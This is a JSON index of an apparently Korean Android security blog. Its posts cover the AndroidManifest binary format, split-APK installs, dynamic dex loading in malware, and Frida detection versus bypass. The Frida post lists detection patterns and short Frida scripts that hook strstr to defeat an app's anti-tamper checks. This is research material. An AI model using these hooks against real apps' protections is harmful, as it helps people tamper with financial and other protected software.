[ { "title": "Anti-Reversing 을 통한 Androidmanifest 복원하기", "url": "/posts/format-manifest/", "categories": "research, android", "tags": "android, research", "date": "2025-03-18 14:28:06 +0900", "snippet": "Introduction최근 안드로이드 앱 분석하는 과정에서 디컴파일이 불가한 apk 가 보여 확인한 결과 디컴파일 방지 기능이 있어 이에 대해 정리하던 도중 xml format 에 대해 정리하고자 한다.block-beta columns 3 block:dex_file:3 %% columns auto (default) classes.dex ...", "content": "Introduction최근 안드로이드 앱 분석하는 과정에서 디컴파일이 불가한 apk 가 보여 확인한 결과 디컴파일 방지 기능이 있어 이에 대해 정리하던 도중 xml format 에 대해 정리하고자 한다.block-beta columns 3 block:dex_file:3 %% columns auto (default) classes.dex classes1.dex classes2.dex classes3.dex classes4.dex classes5.dex classesN.dex end block:lib:2 columns 2 armeabi armeabi_v7a arm64_v8a x86_64 x86 end block:META_INF:1 columns 1 *.RSA *.SF *.MF end block:etc_file:3 %% columns auto (default) xml[\"AndroidManifest.xml\"] assets res resource.arsc end style xml fill:#855안드로이드 메니페스트 파일 포멧은 공식적으로 알려진 게 없다.안드로이드 메니페스트는 안티리버싱으로 쉽게 접할 수 있는 요소중 하나이다.오픈소스로 manifest format 을 변조하는 코드도 있으며 이전 버전에서는 여러 디컴파일 툴들이 파싱을 하지 못한 사례가 있었다.해당 글에서는 manifest format 에서 변조될 수 있는 부분에 대하여 이를 정리해보았다.00000000: 0300 0800 c408 0000 0100 1c00 f404 0000 ................00000010: 2300 0000 0000 0000 0000 0000 a800 0000 #...............00000020: 0000 0000 0000 0000 0e00 0000 1a00 0000 ................00000030: 2c00 0000 4000 0000 4e00 0000 6c00 0000 ,...@...N...l...00000040: 8600 0000 a000 0000 c400 0000 de00 0000 ................00000050: 0401 0000 2a01 0000 6001 0000 6801 0000 ....*...`...h...00000060: 7c01 0000 9601 0000 a601 0000 ba01 0000 |...............00000070: cc01 0000 0402 0000 3002 0000 6802 0000 ........0...h... { . . . }layout 을 변조하는 부분을 () 로 확인해보면 아래와 같다.00000000: 0300 0800(c408 0000)0100 1c00(f404 0000) ................00000010: 2300 0000 0000 0000 0000 0000(a800 0000) #...............00000020: 0000 0000 0000 0000 0e00 0000 1a00 0000 ................00000030: 2c00 0000 4000 0000 4e00 0000 6c00 0000 ,...@...N...l...00000040: 8600 0000 a000 0000 c400 0000 de00 0000 ................00000050: 0401 0000 2a01 0000 6001 0000 6801 0000 ....*...`...h...00000060: 7c01 0000 9601 0000 a601 0000 ba01 0000 |...............00000070: cc01 0000 0402 0000 3002 0000 6802 0000 ........0...h... { . . . }아래에서 각 항목에 대한 설명을 아래와 같다.File Size0x04 - 0x07: File Size파일 사이즈 같은 경우 파일의 마지막 오프셋을 확인하면 알 수 있다. { . . . }00000890: 1700 0000 0301 1000 1800 0000 0200 0000 ................000008a0: ffff ffff ffff ffff 1c00 0000 0101 1000 ................000008b0: 1800 0000 0200 0000 ffff ffff 1200 0000 ................000008c0: 1900 0000 ....String Pool Chunk Size0x0C - 0x0F: String Pool Chunk SizeString Pool Chunk Size 같은 경우 파일에서 사용되는 string Data(문자열 배열의 집합)가 있는데 마지막 stirng Data 가 끝나는 오프셋이다.String Start0x2C - 0x2F: String StartString Start 같은 경우 파일에서 사용되는 string Data(문자열 배열의 집합)가 있는데 첫 string Data 가 시작하는 부분이다.manifest format위와 같이 manifest format 을 볼 수 있고 맨 처음에 본 format 같은 경우 아래를 통해 더 자세하게 참고할 수 있다. Magic Number(0x00080003) 4bytes File Size 4bytes String Chunk Chunk Type(0x001C0001) 4bytes Chunk Size 4bytes String Count 4bytes Style Count 4bytes Flags 4bytes String Pool Offset 4bytes Style Pool Offset 4bytes String Pool Offsets 4bytes * String Count Style Offsets 4bytes * Style Count String Pool (String Data) * String Count String Length 2bytes String Content 2bytes * String Length \\0 2bytes // \\0 { . . . }그 외 section 을 본다면 아래와 같이 볼 수 있다.String Chunk 분석A. String Chunk 헤더 구조 Chunk Type (0x001c0001): StringChunk 유형을 나타내며, 고정된 4바이트 크기. Chunk Size: String Chunk의 전체 크기, 고정된 4바이트. String Count: String Chunk에 포함된 문자열 개수, 고정된 4바이트. 문자열을 해석할 때 사용됨. Style Count: String Chunk에 포함된 스타일 개수, 고정된 4바이트. 일반적으로 0x00000000으로 설정됨. Unknown: 알려지지 않은 영역으로, 고정된 4바이트이며 해석 과정에서 무시됨. String Pool Offset: 문자열 풀의 오프셋 값, 고정된 4바이트. 이 오프셋 값은 StringChunk 헤더(8바이트 위치) 기준 (8 + 0x000000A0) 에 상대적임. Style Pool Offset: 스타일 풀의 오프셋 값, 고정된 4바이트. String Pool: 각 문자열의 오프셋 목록이며, 문자열 개수 × 4바이트 크기를 가짐. Style Pool: 각 스타일의 오프셋 목록이며, 스타일 개수 × 4바이트 크기를 가짐.B. String Chunk 내용 파싱 StringChunk 헤더 시작 위치는 0x08. 문자열 풀 오프셋 값은 0x000000A0. 이 값은 StringChunk 헤더 (0x08) 기준 상대적이므로 실제 위치는 0x000000A8. 0x000000A8 위치에 있는 0x0005 값은 문자열 길이를 나타냄. 문자열의 길이는 0x0005 * 2 바이트 (각 문자가 2바이트). 그 뒤의 10바이트는 문자열 데이터를 저장함. 문자열은 00 00으로 종료됨. UTF-8 문자열은 00으로, UTF-16 문자열은 00 00으로 종료됨. ResourceId Chunk 분석 ChunkType: ResourceId Chunk 유형, 고정된 4바이트 (0x00080180). ChunkSize: ResourceId Chunk의 크기, 고정된 4바이트. ResourceIds: 리소스 ID가 차지하는 전체 바이트 크기. 계산식: (ChunkSize / 4 - 2) * 4 bytes. 상세 분해: a) ChunkSize: ResourceId Chunk의 크기 (0x00000040 → 10진수로 변환하면 64).b) ChunkSize / 4: 리소스 블록의 개수 (4는 4바이트 단위).c) -2: ChunkType과 ChunkSize의 헤더 크기 제거 (8 / 4 = 2).d) * 4: ResourceIds가 차지하는 총 바이트 크기. 예제 계산: (60 / 4 - 2) * 4 = 52 (0x0034).Start Namespace Chunk 분석 ChunkType: Start Namespace Chunk 유형, 고정된 4바이트 (0x00100100). ChunkSize: Start Namespace Chunk 크기, 고정된 4바이트. LineNumber: AndroidManifest.xml에서 해당 네임스페이스가 위치한 행 번호, 고정된 4바이트. 알 수 없는 데이터: 고정된 4바이트. Prefix: 네임스페이스 접두어 (예: android:xxx). Uri: 네임스페이스의 URI (예: http://schemas.android.com/tools).Start Tag Thunk 분석 ChunkType: Start Tag(Ele) Thunk 유형, 고정된 4바이트 (0x00100102). ChunkSize: Start Tag Thunk 크기, 고정된 4바이트. LineNumber: AndroidManifest.xml에서 해당 태그가 위치한 행 번호, 고정된 4바이트. 알 수 없는 데이터: 고정된 4바이트. Namespace Uri: 네임스페이스의 URI (예: android=”http://schemas.android.com/apk/res/android”), 고정된 4바이트. Name: 태그 이름 (StringChunkContent 내의 인덱스 값). Flags (0x00140014): 태그 유형, 고정된 4바이트. Attribute Count: 태그의 속성 개수, 고정된 4바이트. Class Attribute: 태그의 클래스 속성, 고정된 4바이트. Attributes: 속성 정보. 각 속성은 5 * 4 bytes (총 20바이트)로 구성됨. 실제로는 크기가 5인 1차원 배열이며, 각 값의 의미: [Namespace Uri, Name, Value String, Type, Data] Type 값은 24비트 우측 이동하여 가져와야 함. 부정확한 부분이 많아 좀 더 다음에 자세히 다뤄보겠다.Conclusion위와 같은 구조를 가질 수 있는 structure 를 찾을 수 있었으나 더 확실하게 확인하기 위해서는 하나씩 파싱해보는 것이 가장 좋을 것으로 보인다." }, { "title": "adb 로 apk 설치하기", "url": "/posts/adb_install/", "categories": "develop", "tags": "android, develop", "date": "2025-03-16 22:34:12 +0900", "snippet": "Introduction디바이스에서 설치된 앱을 뽑거나 PC 에서 수동으로 앱을 디바이스에 설치해야 할 때가 있다.이때 기본적으로adb install위와 같이 설치를 할 수 있는데분할된 형식의 다중 apk 가 등장하면서 다른 방식으로 설치를 진행해야 한다.What is thatapk 는 안에 다양한 abi 가 포함되어 있는 형태이다.그러면 자연스레 용량...", "content": "Introduction디바이스에서 설치된 앱을 뽑거나 PC 에서 수동으로 앱을 디바이스에 설치해야 할 때가 있다.이때 기본적으로adb install위와 같이 설치를 할 수 있는데분할된 형식의 다중 apk 가 등장하면서 다른 방식으로 설치를 진행해야 한다.What is thatapk 는 안에 다양한 abi 가 포함되어 있는 형태이다.그러면 자연스레 용량이 커질 수 있는데 다중 apk(aab) 은 그러한 apk 의 문제를 해결하기 위한 등장하였으며 이는 구글 스토어에서만 배포할 수 있다는 점이 있다.The Key to Solving the Puzzle단일 APK 일 떄adb install sample.apk위와 같이 쉽게 설치할 수 있다.여러 개의 다중 APK 일 때여러 개의 apk 형식일 경우 install-multiple 이라는 걸 대신 사용하여야 한다.디바이스에서 앱을 추출하기추출하려는 앱의 패키지 이름을 먼저 알아야 하는데 패키지 이름을 입력하면 해당 패키지 이름의 설치된 apk 경로를 반환한다.adb shell pm path com.ruffalo.test결과는 아래와 같다.package:/data/app/~~ruewiorhewoih==/com.ruffalo.test-ioeeoruwero==/base.apkpackage:/data/app/~~ruewiorhewoih==/com.ruffalo.test-ioeeoruwero==/split_config.arm64_v8a.apkpackage:/data/app/~~ruewiorhewoih==/com.ruffalo.test-ioeeoruwero==/split_config.en.apkpackage:/data/app/~~ruewiorhewoih==/com.ruffalo.test-ioeeoruwero==/split_config.ko.apkpackage:/data/app/~~ruewiorhewoih==/com.ruffalo.test-ioeeoruwero==/split_config.xxhdpi.apk그러면 해당 패키지들을 다 로컬로 추출하겠다.adb pull /data/app/~~ruewiorhewoih==/com.ruffalo.test-ioeeoruwero==/base.apk .adb pull /data/app/~~ruewiorhewoih==/com.ruffalo.test-ioeeoruwero==/split_config.arm64_v8a.apk .adb pull /data/app/~~ruewiorhewoih==/com.ruffalo.test-ioeeoruwero==/split_config.en.apk .adb pull /data/app/~~ruewiorhewoih==/com.ruffalo.test-ioeeoruwero==/split_config.ko.apk .adb pull /data/app/~~ruewiorhewoih==/com.ruffalo.test-ioeeoruwero==/split_config.xxhdpi.apk .결과는 아래와 같이 출력된다./data/app/~~ruewiorhewoih==/com.ruffalo.test-ioeeor.../base.apk: 1 file pulled, 0 skipped. 21.6 MB/s (81734290 bytes in 3.613s)/data/app/~~ruewiorhewoih==/com.ruffalo.test-ioeeor...4_v8a.apk: 1 file pulled, 0 skipped. 17.7 MB/s (22200979 bytes in 1.199s)/data/app/~~ruewiorhewoih==/com.ruffalo.test-ioeeor...config.en.apk: 1 file pulled, 0 skipped. 2.4 MB/s (45465 bytes in 0.018s)/data/app/~~ruewiorhewoih==/com.ruffalo.test-ioeeor...config.ko.apk: 1 file pulled, 0 skipped. 2.1 MB/s (24985 bytes in 0.011s)/data/app/~~ruewiorhewoih==/com.ruffalo.test-ioeeor...ig.xxhdpi.apk: 1 file pulled, 0 skipped. 6.4 MB/s (79875 bytes in 0.012s)위와 같이 pull 하여 로컬로 옮긴 것을 볼 수 있다.install-multiple 을 통하여 설치하기아래와 같이 설치해야할 다중 apk 들이 있다고 가정헤보겠다.ruffalo@main test_app % lsbase.apk split_config.arm64_v8a.apk split_config.ko.apksplit_config.en.apk split_config.xxhdpi.apkinstall-multiple 를 통해 설치를 진행한다.ruffalo@main test_app % adb install-multiple base.apk \\&gt; split_config.arm64_v8a.apk \\&gt; split_config.ko.apk \\&gt; split_config.en.apk \\&gt; split_config.xxhdpi.apk adb install-multiple을 사용할 때, 모든 필요한 Split APK를 빠짐없이 제공해야 정상적으로 앱이 실행됩니다." }, { "title": "Frida 탐지 방법에 대한 고찰", "url": "/posts/idea_for_detect_frida/", "categories": "research, android", "tags": "android, research", "date": "2025-03-14 03:58:13 +0900", "snippet": "Introduction일반적으로 안드로이드 어플리케이션을 이용하면 앱은 실행 시 라이브러리를 로드하여 실행할 수 있다. 이는 안드로이드에서 정해 놓은 시스템 파티션이나 앱과 함께 제공되는 디렉터리 경로에서만 라이브러리를 가져와 사용할 수 있다는 의미이다.아래와 같이 정해진 앱의 소스 디렉터리에서 라이브러리를 로드할 수 있다.Loading library...", "content": "Introduction일반적으로 안드로이드 어플리케이션을 이용하면 앱은 실행 시 라이브러리를 로드하여 실행할 수 있다. 이는 안드로이드에서 정해 놓은 시스템 파티션이나 앱과 함께 제공되는 디렉터리 경로에서만 라이브러리를 가져와 사용할 수 있다는 의미이다.아래와 같이 정해진 앱의 소스 디렉터리에서 라이브러리를 로드할 수 있다.Loading library : /data/app/~~p-vfdsffewfewg==/com.ruffalo.test-dQ8dewfeffewfef8qA==/lib/arm64/libnative-lib.so허가되지 않은 혹은 안드로이드 정책에 반하는 위치에 있는 라이브러리가 /proc/self/maps 에서 올라오면 해당 디바이스 환경은 비정상 혹은 위협으로 판단하고서 앱의 실행을 거부하거나 중단하여야 한다.이와 같은 환경과 행동들은 위협 탐지부터 시작하여 위협 탐지 우회 그리고 위협 우회 탐지라는 끝없는 싸움에 방아쇠가 되었다.그러한 기술들 중 하나로 루팅이 있는데 이는 대중이 많이 사용하는 Magisk 개발자가 이야기한 것처럼 hide 라는 기능에 끝없는 패치가 이어졌다고 말한다. MagiskHide Removal; I have lost interest in fighting this battle for quite a while; plus, the existing MagiskHide implementation is flawed in so many ways. Decoupling Magisk from root hiding is, in my opinion, beneficial to the community. Ever since my announcement on Twitter months ago, highly effective “root hiding” modules (much MUCH better than MagiskHide) has been flourishing, which again shows that people are way more capable than I am on this subject. So why not give those determined their time to shine, and let me focus on improving Magisk instead of drowning in the everlasting cat-and-mouse game 😉.본 글에서는 여러 소스코드와 안드로이드 zygote 가 올라오고 앱이 눈에 보이기까지 따라가보면서 변화한 메모리를 통해 비정상 환경을 감지하는 최첨단 탐지 메커니즘을 살펴보았다.그중 동적 바이너리 분석 도구에 대한 탐지 시점과 탐지 우회 그리고 그것을 한 번 더 우회 탐지하는 기법을 사용했는데 이는 마치 고양이와 쥐의 게임을 연상시키는 부분이 없지 않아 있을 것이다.실제 상황을 가정한다면 비정상 환경에서 사용을 막는 앱이 있다고 폈을 때 비정상 단말에서 앱이 실행 상태에 있을 때 앱은 사용을 중단하라고 사용자에게 Alert 를 띄운다.그러나 누군가는 그럼에도 사용할 수 있게 이를 우회하려고 한다. 그러나 또 누군가는 이를 우회할 경우를 대비하여 한 단계 더 고도화된 탐지 대책을 세우고 있다.이러한 끝도 없는 공방전이 이어지는 것이라고 볼 수 있다.Understanding the Core Issue아래는 현재 공개된 몇가지 탐지 아이디어에 대하여 살펴본 케이스이며 실제 소프트웨어에서도 사용되는 방법이다.본 글에서는 자체 검파일한 바이너리를 사용하였다.메모리를 통한 탐지먼저 비정상 환경이 준비된 모바일이나 그러한 앱이 설치된 모바일을 준비한다.그 후 모바일에서 탐지 로직이 적용된 어플리케이션을 시작한다.이때 앱의 pid 를 살펴보면 아래와 같다.현재 pid 는 20109 이다.{ \"arch\": \"arm64\", \"codeSigningPolicy\": \"optional\", \"id\": 20109, \"pageSize\": 4096, \"platform\": \"linux\", \"pointerSize\": 8}로컬 PC 에서 모바일에 리눅스 쉘처럼 붙을 수 있는데 쉘로 먼저 접근한다.x1q:/proc/20109 # cat maps | grep ruffalo 6d22b2c000-6d23555000 r--p 00000000 00:01 265762 /memfd:ruffalo-agent-64.so (deleted)6d23556000-6d2428d000 r-xp 00a29000 00:01 265762 /memfd:ruffalo-agent-64.so (deleted)6d2428d000-6d2435e000 r--p 0175f000 00:01 265762 /memfd:ruffalo-agent-64.so (deleted)6d2435f000-6d2437a000 rw-p 01830000 00:01 265762 /memfd:ruffalo-agent-64.so (deleted)x1q:/proc/20109 #위에서 볼 수 있는 것처럼 /proc/[pid] 에 접근하여 maps 를 살펴보면 현재 메모리에 올라온 Frida 를 살펴볼 수 있다.보통 이러한 로직을 작성한다고 하면 아래와 같을 것으로 보인다.상황에 따라서 다를 수 있지만 이해를 위하여 간단하게 작성해본다.char* p_result = strstr(readline_from_maps, \"/memfd:ruffalo-agent-64.so\");if (NULL != p_result) { // Detected __android_log_print(ANDROID_LOG_VERBOSE, \"Sample-Test\", \"Found\");}strstr 함수는 아래와 같은 인자를 받고 반환을 한다.char* strstr(const char *string1, const char *string2)string2 문자열이 string1 에 존재한다면 string2 문자열을 반환하며 존재하지 않으면 0 을 반환한다.따라서 maps 에서 읽은 문자열에 탐지하려는 문자열이 있는지 확인하는 것이다.메모리 탐지 우회이를 우회하는 걸 봐보갰다./proc/[pid]/maps 에 올라온 agent 를 탐지하였는데 이를 우회한다면 다음과 같을 것이다.실제라면 로직을 보호하기 위하여 고난도의 난독화와 암호화 그리고 런타임 탐지로 로직을 들여다보기 힘들텐데 현재는 이 과정을 다 우회했다고 가정한다.Interceptor.attach(Module.getExportByName('libc.so', 'strstr'), { onEnter: function (args) { var str1 = Memory.readCString(args[0]); var str2 = Memory.readCString(args[1]); if (str2.indexOf(\"/memfd:ruffalo-agent-64.so\") != -1){ console.log(\"str1:%s str2:%s\\n\", str1, str2); this.hook= true; } }, onLeave: function (retval) { if (this.hook) { retval.replace(0x0); console.log(\"Replace ret value to 0\"); } }});위와 같이 우회 스크립트를 작성할 수 있는데 strstr 함수 반환값을 조작할 수 있다.str2.indexOf(\"string\")해당 함수는 str2 문자열 안에 string 이 있다면 시작하는 그 문자열의 인덱스 번호를 반환하고 없으면 -1 을 반환하는 함수이다.즉 특정 문자열을 발견하면 strstr 반환값을 0 으로 변조하는 것이다. strstr(str1, str2) 반환값 0 이 의미하는 것은 str1 안에 str2 이 없다는 의미이다.실행중인 프로세스 탐지를 통한 우회 탐지앞에서 메모리를 통한 탐지를 진행했는데 특정 문자열일 때 반환값을 변조하여 우회한 것을 볼 수 있다.그럼 이번에는 이에 대응하여 프로세스를 통한 탐지를 진행해겠다.x1q:/proc/20109 # ps -ef | grep ruffalo root 21513 30531 19 02:29:32 /debug_ramdisk/.magisk/pts/1 00:00:00 grep ruffaloroot 24938 1 0 01:35:54 ? 00:05:36 ruffalo-server-16.6.3-android-arm64root 24954 1 0 01:35:56 ? 00:00:00 10 unix:abstract=/ruffalo-b8b5725d-57e7-4c20-b8f7-8e7573912b0dx1q:/proc/20109 #위 프로세스 탐지도 비슷하게 진행 할 수 있다.ps 명령어를 통해 현재 실행중인 프로세스들을 볼 수 있다.아래와 같이 구현할 수 있을 것이다.char* p_result = strstr(readline_from_process, \"ruffalo-server-16.6.3-android-arm64\");if (NULL != p_result) { // Detected __android_log_print(ANDROID_LOG_VERBOSE, \"Sample-Test\", \"Found\");}process 를 확인하는 명령어를 통해 해당 문자열을 파싱하고 탐지하려는 문자열이 있는지 확인하는 것이다.위는 예시이며 여러 방법이 있겠지만 실제론 오탐을 줄이고 정탐을 높게 구현하는 게 중요하다.실행중인 프로세스 탐지 우회process 를 확인하고 이때 실행중인 여부를 확인하는 것인데 이를 우회한다면 다음과 같을 것이다.Interceptor.attach(Module.getExportByName('libc.so', 'strstr'), { onEnter: function (args) { var str1 = Memory.readCString(args[0]); var str2 = Memory.readCString(args[1]); if (str2.indexOf(\"ruffalo-server-16.6.3-android-arm64\") != -1){ console.log(\"str1:%s str2:%s\\n\", str1, str2); this.hook= true; } }, onLeave: function (retval) { if (this.hook) { retval.replace(0x0); console.log(\"Replace ret value to 0\"); } }});이도 동일하게 특정 문자열인지 확인하고 반환값을 변조하여 우회하는 스크립트이다.네트워크 탐지를 통한 우회 탐지그럼 이번에는 네트워크를 통하여 우회 탐지를 진행해보려고 한다.netstat 는 어플리케이션이나 디바이스에 네트워크 상태를 보여주는 명령어이다.명령어를 통해 아래와 같이 현재 연결된 정보를 볼 수 있다.x1q:/proc/21522 # netstat | grep ruffalo unix 3 [ ] STREAM CONNECTED 29075456 @/ruffalo-87868e60-a33d-415a-ba9e-2718ebaf230dunix 2 [ ] STREAM CONNECTED 7130091 @/ruffalo-c99f0fff-fcd1-42ff-a321-4e2546485a58unix 2 [ ] STREAM CONNECTED 3545381 @/ruffalo-6afc2dde-d4d1-4050-8c17-b91aa1a0afae { . . .}unix 2 [ ] STREAM CONNECTED 5332037 @/ruffalo-f561ed25-df09-40c5-b0fe-ee037f88f74aunix 2 [ ] STREAM CONNECTED 7213926 @/ruffalo-c4e008d7-df55-4d85-a5b0-61ffe3f548d4x1q:/proc/21522 # 아래와 같이 동일하게 특정 문자열을 탐지할 수 있다.char* p_result = strstr(readline_from_process, \"ruffalo\");if (NULL != p_result) { // Detected __android_log_print(ANDROID_LOG_VERBOSE, \"Sample-Test\", \"Found\");}netstat 실행을 통해 해당 문자열을 파싱하고 탐지하려는 문자열이 있는지 확인하는 것이다.명령어 결과에 따라 구현 로직이 튕길 수 있어서 모든 경우의 수에 다 부합하게 작성하는 게 중요하다.네트워크 탐지 우회위에서 구현한 netstat 를 확인하고 이때 실행중인 여부를 확인하는 코드를 우회한다면 다음과 같을 것이다.Interceptor.attach(Module.getExportByName('libc.so', 'strstr'), { onEnter: function (args) { var str1 = Memory.readCString(args[0]); var str2 = Memory.readCString(args[1]); if (str2.indexOf(\"ruffalo\") != -1){ console.log(\"str1:%s str2:%s\\n\", str1, str2); this.hook= true; } }, onLeave: function (retval) { if (this.hook) { retval.replace(0x0); console.log(\"Replace ret value to 0\"); } }});위와 같이 특정 문자열을 찾아서 대입해주면 쉽게 우회가 가능하다.포트 스캔 탐지를 통한 우회 탐지그럼 이번엔 포트 스캔을 통해 우회 탐지를 진행해보겠다.netstat 에 -ntlp 를 사용하면 LISTEN 중인 포트 정보 표시한다. Frida 같은 경우 실행 시 포트를 지정할 수 있어서 손쉽게 포트 변경이 가능하다.x1q:/proc/21522 # netstat -ntlp | grep ruffalo tcp 0 0 127.0.0.1:27042 0.0.0.0:* LISTEN 24938/ruffalo-server-16.6.3-android-arm64tcp6 0 0 [::]:34459 [::]:* LISTEN 24938/ruffalo-server-16.6.3-android-arm64x1q:/proc/21522 #이는 아래의 옵션들이 조합된 것이다.-l\tListening server sockets-t\tTCP sockets-n\tDon't resolve names-p\tShow PID/program name of sockets이를 통해 열려있는 포트를 검사하거나 문자열을 검사할 수 있을 것이다.bool result = strstr(readline_netstat, \"27042\") &amp;&amp; strstr(readline_netstat, \"LISTEN\");if (true == result) { // Detected __android_log_print(ANDROID_LOG_VERBOSE, \"Sample-Test\", \"Found\");}위처럼 netstat 결과에서 알 수 있듯이 열려있는 포트 번호와 현재 LISTEN 상태인지 탐지하는 것이다.포트 스캔 탐지 우회포트 스캔 방식도 우회한다면 다음과 같을 것이다.Interceptor.attach(Module.getExportByName('libc.so', 'strstr'), { onEnter: function (args) { var str1 = Memory.readCString(args[0]); var str2 = Memory.readCString(args[1]); if (str2.indexOf(\"27042\") != -1 || str2.indexOf(\"LISTEN\") != -1){ console.log(\"str1:%s str2:%s\\n\", str1, str2); this.hook= true; } }, onLeave: function (retval) { if (this.hook) { retval.replace(0x0); console.log(\"Replace ret value to 0\"); } }});포트 번호와 LISTEN 문자열일 때 반환값을 변조하여 우회한다.Conclusion지금까지 Frida 를 탐지할 수 있는 방법들을 살펴보았다. 이외에도 수십가지 방법으로 Frida 를 탐지할 수 있는 방법이 존재한다. 하지만 재밌는 점은 Frida 를 통해 Frida 탐지 기능을 우회할 수 있다는 점이다.메모리 동작을 통한 탐지 방법은 깊게 알아봐야 하지만 우회는 탐지 기능을 비웃는 것처럼 아주 손쉽게 후킹을 통해 회피할 수 있다.탐지하는 기능이든 우회든 방도를 알아보기 위하여 깊숙하게 알아봐야 하는 건 동일하다.위 환경은 사실 일반적인 앱 상테에서 감지해야 하는 것이 조건이므로 좀 더 아이디어를 내야 할 부분이 많을 것이다. 적용할 수 없는 아이디어가 훨씬 많을 것이며 사용할 수 없는 방법들도 많을 것이다.이와 비슷하게 루팅 기술 또한 비슷한 스토리를 가지고 있다. 루팅은 shamiko 라는 모듈을 통해 추가적으로 zygisk 흔적을 지우는데 사용된다.수차례 보안개발자들이 탐지 방법을 찾아내면서 Magisk 쪽에서도 몇번 패치를 하는데 이또한 길고 긴 공방전으로 이어지곤 했다.탐지 방법을 가졌다하더라도 2차, 3차적으로 대책을 세워야 할 것으로 보인다.단순하게 코드를 작성하면 탐지 로직이 훤히 읽혀 금방 우회가 가능하다.난독화나 암호화 또는 형식화된 호출을 피하거나 한 단계 낮은 네이티브 레벨의 언어를 사용한다면 우회를 위한 분석 또한 쉽지 않을 것이다.그래서 금융앱이나 핀테크 앱은 깊은 곳에 보안기술이 꽁꽁 숨겨져있어 공격자들은 이를 파헤쳐 우회할 수 있는 로직을 찾아내기도 한다.그렇게되면 우회는 이전과 다르게 때론 Direct 하게 접근해야 할 수 있고 탐지 로직을 무력화하기 위하여 기존에 유효했던 탐지 아이디어들을 의미없거나 랜덤한 값으로 바뀐 바이너리를 사용할 수 있다.이외에도 많은 도구와 환경들이 있는데 이러한 것들은 실행 시 안드로이드 깊숙한 메모리 어딘가에 흔적을 남기며 이를 코드로 로직화하면 정상적으로 탐지할 수 있다.그러나 최근 코드 Binary instrumentation 기능이 강화되어 앱 시작 전 dynamic hook 을 준비하여 모든 코드 호출부를 추적할 수 있다.따라서 아무리 완벽한 탐지 시그니처와 수단을 가졌다하더라도 마침내 로직은 쉽게 우회될 것이다." }, { "title": "동적으로 로드되는 실행 파일에 대한 고찰 - 1", "url": "/posts/malware_analysis_a/", "categories": "research", "tags": "research, android", "date": "2025-03-12 10:04:03 +0900", "snippet": "Introduction최근 여러 개의 Malware 를 포함해서 software-protection 이 적용된 앱들을 분석할 기회가 생겼다. Malware 라고 단정 지을 수 없지만 안티 리버싱이 적용된 앱들이 많아 평소보다 분석이 쉽지 않았던 케이스가 많았다. 이러한 목적은 소스코드 방어 목적도 있지만 어떤 의도를 가진 소프트웨어인지 비공개하기 위한...", "content": "Introduction최근 여러 개의 Malware 를 포함해서 software-protection 이 적용된 앱들을 분석할 기회가 생겼다. Malware 라고 단정 지을 수 없지만 안티 리버싱이 적용된 앱들이 많아 평소보다 분석이 쉽지 않았던 케이스가 많았다. 이러한 목적은 소스코드 방어 목적도 있지만 어떤 의도를 가진 소프트웨어인지 비공개하기 위한 여러가지 제한을 하고자 적용한 앱들도 있다. 이러한 앱들을 분석해보면 메인 코드가 대부분 비어있었다. 그러나 앱을 실행하면 정상적으로 구동되는 앱들이었다.디바이스에 존재하지 않는 코드가 어떻게 실행되는지 살펴본 결과 기상천외한 방법들이 있었고 그중 일반적인 것이 파일을 다운받는 형태를 볼 수 있었다. 과정을 복잡하게 해놓는 게 대부분이긴 하지만 네트워크 통신할 때 패킷을 살펴보면 실행파일을 가쟈오는 걸 알 수 있다.해당 글에서는 동적으로 생기는 파일을 확인하고 메모리에 올라가는 실행 파일을 확인하는 것까지 진행해보겠다.What is that바이너리에 존재하지 않는 코드가 어떻게 실행 시 문제 없이 진행되는 걸 보면 Android 에서 동적으로 로드할 수 있는 몇가지 API 가 있다.classDiagram ClassLoader &lt;|-- BaseDexClassLoader BaseDexClassLoader &lt;|-- DexClassLoader BaseDexClassLoader &lt;|-- PathClassLoader class ClassLoader{ } class DexClassLoader{ -load() } class PathClassLoader{ +load() }위와 같이 동적으로 로드할 수 있는 클래스가 있는데 이중에서 DexClassLoader 를 중점으로 바라보고자 한다. 또한 이중 빠진 API 가 있는데 메모리에서 로드하는 InMemoryDexClassLoader API 가 누락되었다.How We Got Hereassets/ 에 저장되어있는 파일을 불러와 안드로이드 내부에 저장하는 걸 볼 수 있는데 이때 File API 를 확인하면 실행 시 동적으로 내부에 파일을 저장하는 걸 볼 수 있다.안드로이드 내부 디렉터리에 관한 내용은 다음과 같은 글에 따로 정리하였다.[*] b'Hidden File opened for write /data/user/0/ww.rksr.jjiuuuu.lsls/nnn.dex'[*] b'Got 503724 bytes!'[*] b'Waiting..'[*] b'Write..'[*] Successfully dumped to nnn.dex위와 같이 실행 시 파일을 생성한 후 assets 에 있는 내용을 로컬에 저장하는 걸 확인할 수 있다.dex 를 로드하는 방법에는 몇년 전만해도 한 가지 방법 밖에 없었는데 최근 들어 디바이스 내에 그 어떤 파일을 만들지 않고 메모리 영역에 올려 코드를 로드하는 방법이 생겼다.그래서 총 2가지 방법이 있는데 여기서 2가지 방법 다 다뤄볼 생각이다.A Critical BreakthroughFile 로 로드하는 방법assets 에 있는 파일을 안드로이드 내부 디렉터리에 저장한 후 동적으로 해당 파일을 로드하는 방법이다.public DexClassLoader (String dexPath, , String optimizedDirectory , String librarySearchPath ClassLoader parent)파일을 로드할 때는 위와 같은 API 를 사용하여 진행한다.동적으로 로드된 dex 파일을 확인하면 아래와 같이 apk 바이너리 안에 있는 dex 파일을 포함하여 실행 시 로드되는 dex 들을 함께 확인할 수 있다.[Dex1] : /data/user/0/ww.rksr.jjiuuuu.lsls/classes1.dex[Dex2] : /data/user/0/ww.rksr.jjiuuuu.lsls/classes2.dex[Dex3] : /data/user/0/ww.rksr.jjiuuuu.lsls/classes3.dex[Dex4] : /data/user/0/ww.rksr.jjiuuuu.lsls/classes4.dex[Dex5] : /data/user/0/ww.rksr.jjiuuuu.lsls/classes5.dex[Dex6] : /data/user/0/ww.rksr.jjiuuuu.lsls/classes6.dex[Dex7] : /data/user/0/ww.rksr.jjiuuuu.lsls/classes7.dex[Dex8] : /data/user/0/ww.rksr.jjiuuuu.lsls/classes8.dex[Dex9] : /data/user/0/ww.rksr.jjiuuuu.lsls/classes9.dex[Dex10] : /data/user/0/ww.rksr.jjiuuuu.lsls/classes10.dex[Dex11] : /data/user/0/ww.rksr.jjiuuuu.lsls/classes11.dex[Dex12] : /data/user/0/ww.rksr.jjiuuuu.lsls/classes12.dex[Dex13] : /data/user/0/ww.rksr.jjiuuuu.lsls/classes13.dex여기서 일반 dex file 도 볼 수 있고 실행 중 올라간 dex file 도 확인할 수 있다.Memory 에서 로드하는 방법로컬 내부 디렉터리에 파일을 따로 생성하지 않고 